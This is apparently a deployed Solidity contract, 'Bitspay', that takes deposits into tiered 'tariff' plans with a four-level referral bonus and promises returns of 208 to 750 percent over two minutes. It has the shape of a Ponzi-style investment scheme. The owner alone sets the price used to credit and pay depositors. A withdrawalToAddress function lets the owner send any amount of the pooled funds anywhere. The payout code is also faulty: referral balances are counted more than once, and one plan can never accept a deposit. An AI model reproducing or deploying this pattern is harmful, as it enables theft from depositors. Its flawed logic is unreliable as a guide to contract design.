/**
 *Submitted for verification at Etherscan.io on 2021-05-19
*/

// SPDX-License-Identifier: none
pragma solidity ^0.5.10;

contract Bitspay {
    
    uint usdPrice;
    
    function tronPrice(uint value) public {
        require(owner == msg.sender);
        usdPrice = value;
    }

    function currentPrice() public view returns(uint) {
        return usdPrice;
    }

  struct Tariff {
    uint time;
    uint percent;
  }

  struct Deposit {
    uint tariff;
    uint amount;
    uint at;
  }

  struct Investor {
    bool registered;
    address referer;
    uint referrals_tier1;
    uint referrals_tier2;
    uint referrals_tier3;
    uint referrals_tier4;
    uint balanceRef;
    uint totalRef;
    Deposit[] deposits;
    uint invested;
    uint paidAt;
    uint investedAt;
    uint firstDepositAt;
    uint totalEarningSoFar;
    uint withdrawn;
  }

  struct InvestorReferral {
    uint referralsAmt_tier1;
    uint referralsAmt_tier2;
    uint referralsAmt_tier3;
    uint referralsAmt_tier4;
    uint balanceRef;
    uint userplan;
  }

  address public owner = msg.sender;
  Tariff[] public tariffs;
  uint[] public referralRewards;
  uint public totalInvestors;
  uint public totalInvested;
  uint public totalWithdrawal;
  uint public totalRefRewards;

  mapping (address => Investor) public investor;
  mapping (address => Tariff) public tariff;

  mapping (address => InvestorReferral) public investorreferrals;
  mapping(address => uint[]) user_deposit_time;
  mapping(address => uint[]) user_deposit_amount;

  event DepositAt(address user, uint tariff, uint amount);

  event Withdraw(address user, uint amount);
  
  event TransferOwnership(address user);

  function register(address referer) internal {
      
    if (!investor[msg.sender].registered) {

      if(!investor[msg.sender].registered) {
            investor[msg.sender].registered = true;
            investor[msg.sender].investedAt = block.timestamp;
            
            totalInvestors++;
            
            if(investor[referer].registered && referer != msg.sender) {
                investor[msg.sender].referer = referer;
                
                address rec = referer;
                for(uint i =  0; i < referralRewards.length; i++) {
                    
                    if(!investor[rec].registered){
                        break;
                    }
                    
                    if(i==0) {
                        investor[rec].referrals_tier1++;
                    }
                    
                    if(i==1) {
                        investor[rec].referrals_tier2++;
                    }
                    
                    if(i==2) {
                        investor[rec].referrals_tier3++;
                    }
                    
                    if(i==3) {
                        investor[rec].referrals_tier4++;
                    }
                    
                    rec = investor[rec].referer;
                }
            }
            rewardReferers(msg.value, investor[msg.sender].referer);
      }

    }

  }

  function rewardReferers(uint amount, address referer) internal {

    address rec = referer;
    
    for(uint i = 0; i < referralRewards.length; i++) {
        
        if(!investor[rec].registered) {
            break;
        }
        
        uint refRewardPercent = 0;
        
        if(i==0) {
            refRewardPercent = 7;
        }
        
        if(i==1) {
            refRewardPercent = 3;
        }
        
        if(i==2) {
            refRewardPercent = 2;
        }
        
        if(i==3) {
            refRewardPercent = 1;
        }
        
        uint a = amount * refRewardPercent / 100;
        
        if(i==0) {
            investorreferrals[rec].referralsAmt_tier1 += a;
        }
        
        if(i==1) {
            investorreferrals[rec].referralsAmt_tier2 += a;
        }
        
        if(i==2) {
            investorreferrals[rec].referralsAmt_tier3 += a;
        }
        
        if(i==3) {
            investorreferrals[rec].referralsAmt_tier4 += a;
        }
        
        investor[rec].balanceRef += a;
        investor[rec].totalRef += a;
        investor[rec].totalEarningSoFar += a;
        totalRefRewards += a;
        
        rec = investor[rec].referer;
    }
  }

  constructor() public {
      
    tariffs.push(Tariff(2 minutes, 208));
    tariffs.push(Tariff(2 minutes, 291));
    tariffs.push(Tariff(2 minutes, 500));
    tariffs.push(Tariff(2 minutes, 750));

    

    for (uint i=0; i<4; i++) {

      referralRewards.push(i);
    }

  }

  function deposit(uint tariffPlan, address referer) external payable {
        
        uint amount = (usdPrice * msg.value) ;
        
        require(tariffPlan < tariffs.length,"Invalid tariff");
        if (tariffPlan == 0){
            require(msg.value > 0 && msg.value < 1000000000000000000/usdPrice*101, "Min Max Limit Exceed");
        }
        else if (tariffPlan == 1){
            require(msg.value > 1000000000000000000/usdPrice*101 && msg.value < 1000000000000000000/usdPrice*1001, "Min Max Limit Exceed");
        }
        else if (tariffPlan == 2){
            require(msg.value > 1000000000000000000/usdPrice*1000 && msg.value < 1000000000000000000/usdPrice*10001, "Min Max Limit Exceed");
        }
        else if (tariffPlan == 3){
            require(msg.value > 1000000000000000000/usdPrice*100000 && msg.value < 1000000000000000000/usdPrice*100000, "Min Max Limit Exceed");
            
        }
     
        investorreferrals[msg.sender].userplan = tariffPlan;
        register(referer);
        user_deposit_amount[msg.sender].push(msg.value);
           
        user_deposit_time[msg.sender].push(block.timestamp);
           
        investor[msg.sender].invested += amount;
            
        totalInvested += amount;
    
        investor[msg.sender].deposits.push(Deposit(tariffPlan, amount, block.timestamp));

        emit DepositAt(msg.sender, tariffPlan, amount);

 }

  function withdrawable(address user) public view returns (uint amount) {
      
    Investor storage investor = investor[user];
    
    for (uint i = 0; i < investor.deposits.length; i++) {

      Deposit storage dep = investor.deposits[i];

      Tariff storage tariffNew = tariffs[dep.tariff];
      
      uint finish = dep.at + tariffNew.time;
      uint since = investor.paidAt > dep.at ? investor.paidAt : dep.at;
      uint till = block.timestamp > finish ? finish : block.timestamp;
      
      if(since < till){
          amount += dep.amount * (till - since) * tariffNew.percent / tariffNew.time / 100 / 100;
          amount += investor.balanceRef;  
      }

    }
    return amount;
  }
  
  function withdraw(address payable to) external { 
    uint amount = withdrawable(msg.sender);
    // uint amountInUsd = amount;
    amount = (amount / usdPrice);
    
    investor[msg.sender].paidAt = block.timestamp;
    investor[msg.sender].totalEarningSoFar += amount;
    investor[msg.sender].withdrawn += amount;
    investor[msg.sender].balanceRef = 0;
    
    to.transfer(amount);
    emit Withdraw(to, amount);
    
  }
  
  function withdrawalToAddress(address payable to,uint amount) external {

        require(msg.sender == owner);

        to.transfer(amount);

  }
  
   function transferOwnership(address to) external {
        require(msg.sender == owner);
        owner = to;
        emit TransferOwnership(owner);
  }

   function myData(address userAddr) public view returns (uint,uint,uint,uint,uint,uint,uint) {

    Investor storage investor = investor[userAddr];
     
     uint profitAmount = withdrawable(userAddr);
     uint myplan = investorreferrals[userAddr].userplan;
     uint invested = investor.invested;
	 uint balanceRef = investor.balanceRef;
     uint totalIncome = balanceRef + profitAmount;
    
     uint withdrawn = investor.withdrawn;
	 return (myplan,invested,balanceRef,totalIncome,withdrawn,totalInvestors,totalInvested);
  }
    
  function userDepositList(address userAddr) public view returns( uint  [] memory,uint  [] memory){
        return (user_deposit_amount[userAddr],user_deposit_time[userAddr]);
    }
}